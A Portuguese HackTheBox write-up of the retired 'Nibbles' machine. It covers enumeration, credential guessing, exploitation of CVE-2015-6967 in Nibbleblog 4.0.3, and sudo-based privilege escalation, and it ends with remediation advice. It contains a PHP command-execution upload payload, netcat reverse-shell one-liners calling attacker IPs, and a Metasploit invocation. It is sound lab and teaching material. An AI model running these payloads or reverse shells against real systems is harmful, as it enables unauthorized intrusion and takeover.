# Nibbles — HackTheBox

**Plataforma:** HackTheBox
**Dificuldade:** Easy
**SO:** Linux (Ubuntu 16.04)
**Data:** 24/07/2026
**Tags:** #enum #foothold #file-upload #privesc #sudo-misconfig
**Status:** Retired ✅ (publicação em conformidade com os ToS do HTB)

---

## Resumo

A máquina expõe SSH e um servidor Apache rodando o **Nibbleblog v4.0.3** em
`/nibbleblog`. A enumeração de diretórios revelou um `README` que expôs a
versão da aplicação, e o arquivo `users.xml` confirmou o usuário `admin`. As
credenciais foram obtidas por tentativa lógica (`admin:nibbles`, baseado em
referências repetidas ao termo "nibbles" no `config.xml`). Com acesso ao
painel admin, o plugin **"My image"** permitiu upload irrestrito de arquivo,
explorando a **CVE-2015-6967**, resultando em RCE como o usuário `nibbler`.
A escalação para root foi possível por uma entrada de `sudoers` que permitia
executar `monitor.sh` sem senha — um script pertencente ao próprio usuário,
o que possibilitou injeção de um reverse shell nele.

**Técnicas demonstradas:** enumeração web (curl, gobuster), leitura de
arquivos de configuração expostos, credential guessing orientado por
contexto, unrestricted file upload → RCE, privilege escalation via
sudoers misconfiguration.

---

## 1. Reconhecimento

### 1.1 Varredura de portas

```
nmap -sC -sV 10.129.200.170
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Apenas duas portas abertas. Sem título na página HTTP — indício de que o
conteúdo relevante está em outro caminho, não na raiz.

### 1.2 Enumeração do serviço web

```
curl http://10.129.200.170

<b>Hello world!</b>
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

O próprio comentário HTML aponta o diretório `/nibbleblog/`. A partir daí,
enumeração de diretórios com Gobuster:

```
gobuster dir -u http://10.129.200.170/nibbleblog -w /usr/share/seclists/Discovery/Web-Content/common.txt

.htpasswd  (403)
README     (200)
admin      (301) --> /nibbleblog/admin/
admin.php  (200)
content    (301) --> /nibbleblog/content/
```

O arquivo `README` e o diretório `admin.php` chamam atenção — normalmente
`README` de CMS entrega a versão exata da aplicação:

```
curl http://10.129.200.170/nibbleblog/README
Nibbleblog v4.0.3
```

Versão conhecida por ter uma vulnerabilidade de upload de arquivo (ver seção
2.1), mas explorá-la requer autenticação — então o próximo passo foi buscar
credenciais.

### 1.3 Coleta de credenciais expostas

Dentro de `/nibbleblog/content/private/`, o arquivo `users.xml` confirma o
usuário administrador:

```
curl -s http://10.129.200.170/nibbleblog/content/private/users.xml | xmllint --format -
<user username="admin">
  <id type="integer">0</id>
</user>
```

E o `config.xml` do mesmo diretório menciona o termo "Nibbles"/"nibbles"
repetidamente (nome do site, e-mail de notificação, etc). Combinando isso
com o fato de o brute-force estar bloqueado (rate limiting visível no
`session_fail_count`), optei por uma tentativa dirigida em vez de brute
force: `admin:nibbles`. Login bem-sucedido:

![Painel administrativo do Nibbleblog](assets/admin-dashboard.png)

---

## 2. Obtendo Acesso (Foothold)

### 2.1 Vulnerabilidade identificada

O painel admin expõe o plugin **"My image"**, que permite upload de arquivo
de imagem. A versão 4.0.3 do Nibbleblog não valida corretamente a extensão
do arquivo enviado, permitindo o upload de um `.php` executável — isso é
catalogado como **CVE-2015-6967**: uma falha de upload irrestrito de arquivo
no plugin My Image, que permite a um administrador autenticado executar
código arbitrário via requisição direta ao arquivo enviado.

### 2.2 Exploração

Payload de teste enviado via o campo de upload do plugin:

```php
<?php system('id'); ?>
```

Acesso direto ao arquivo confirma execução de código:

```
curl http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

Substituindo o payload por um reverse shell e reenviando:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```

Com listener ativo (`nc -lvnp 9443`), shell como `nibbler` obtido.

### 2.3 Rota alternativa — Metasploit

O mesmo vetor está disponível como módulo pronto, útil para validar o achado
de forma independente:

```
msf > use exploit/multi/http/nibbleblog_file_upload
set RHOSTS 10.129.200.170
set USERNAME admin
set PASSWORD nibbles
set TARGETURI nibbleblog
set LHOST 10.10.14.140
exploit

[+] Deleted image.php
[*] Command shell session 1 opened -> uid=1001(nibbler)
```

---

## 3. Escalação de Privilégio

### 3.1 Enumeração local

```
sudo -l
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

O script `monitor.sh` pertence ao próprio usuário `nibbler`, o que significa
que ele pode ser editado livremente antes de ser executado como root.

### 3.2 Exploração

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.140 8443 >/tmp/f' | tee -a monitor.sh
sudo ./monitor.sh
```

Com listener ativo (`nc -lvnp 8443`), shell como `root` obtido de forma
praticamente instantânea.

### 3.3 Caminho alternativo de privesc (não explorado nesta sessão)

Por ser uma máquina antiga (kernel Ubuntu 16.04), é provável que exista uma
segunda rota de privesc via kernel exploit desatualizado. Fica como próximo
passo enumerar `uname -a` e cruzar com CVEs de kernel da época, para
documentar essa via alternativa em uma revisão futura deste write-up.

---

## 4. Flags

```
user.txt: [omitido — capturado com sucesso]
root.txt: [omitido — capturado com sucesso]
```

---

## 5. Causa Raiz & Remediação

- **Causa raiz:** (1) informações de versão expostas publicamente via
  `README` e arquivos de configuração em diretório acessível; (2) senha
  fraca e previsível, derivada do próprio nome do produto; (3) validação
  de extensão de arquivo ausente no plugin de upload; (4) entrada de
  `sudoers` apontando para um script gravável pelo próprio usuário que a
  executa.

- **Remediação:**
  - Restringir acesso a arquivos de metadados/configuração (`README`,
    `*.xml`) via regra de servidor web ou remoção em produção.
  - Atualizar para Nibbleblog ≥ 4.0.5, ou aplicar validação de
    tipo real do arquivo (magic bytes, não apenas extensão) em qualquer
    funcionalidade de upload.
  - Política de senha que impeça uso de termos derivados do nome do
    produto/empresa (regra comum em ambientes PCI-DSS).
  - Nunca apontar `sudoers` para scripts com permissão de escrita pelo
    usuário que os executa — o alvo do `NOPASSWD` deve ser sempre
    imutável para quem o invoca.

- **Lição para ambientes reais:** o mesmo padrão de "sudoers apontando
  para arquivo gravável" é um erro comum em ambientes de infraestrutura
  corporativa — é um dos itens que vale a pena checar em qualquer
  hardening de servidores Linux em produção, inclusive fora do contexto
  de CTF.

---

## Referências

- CVE-2015-6967 — Nibbleblog My Image Plugin Unrestricted File Upload
- Curesec Security Advisory, NibbleBlog 4.0.3: Code Execution (2015-09-01)
